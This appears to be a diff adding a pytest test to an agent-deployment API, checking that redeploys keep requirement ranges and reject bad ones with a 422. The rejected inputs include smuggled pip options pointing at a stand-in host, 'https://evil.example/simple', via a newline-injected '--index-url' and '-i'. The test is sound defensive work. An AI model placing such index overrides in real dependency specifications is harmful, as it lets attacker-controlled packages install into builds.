@@ -225,6 +225,27 @@ def test_redeploy_of_a_converted_agent_keeps_its_baked_prompt_and_model(client, 
     assert ok.status_code == 202
 
 
+def test_a_converted_agents_requirement_ranges_survive_redeploy_and_bad_ones_are_422(
+    client, no_real_deploy
+):
+    """#300 AC6: the re-resolve input rides a re-publish like `source_harness`; a range
+    that could widen the build's index boundary is a 422 before anything is written."""
+    ranges = ["botocore[crt] >= 1.35.0", "mcp >= 1.19.0"]
+    spec = {**CONVERTED_SPEC, "requirement_ranges": ranges}
+    agent_id = client.post("/api/agents", json=spec).json()["agent"]["id"]
+    _activate(agent_id)
+    for bad in (["mcp>=1.19\n--index-url https://evil.example/simple"],
+                ["-i https://evil.example/simple"],
+                ["pkg @ git+https://github.com/o/r@" + "0" * 40]):
+        res = client.post(f"/api/agents/{agent_id}/redeploy",
+                          json={**spec, "requirement_ranges": bad})
+        assert res.status_code == 422, res.text
+    ok = client.post(f"/api/agents/{agent_id}/redeploy",
+                     json={**spec, "memory": {"short_term": False, "long_term": False}})
+    assert ok.status_code == 202
+    assert client.get(f"/api/agents/{agent_id}").json()["spec"]["requirement_ranges"] == ranges
+
+
 def test_redeploy_conflicts_while_deploying(client):
     # a freshly created agent is still "deploying" (pipeline stubbed) → no re-publish
     agent_id = client.post("/api/agents", json=SPEC).json()["agent"]["id"]
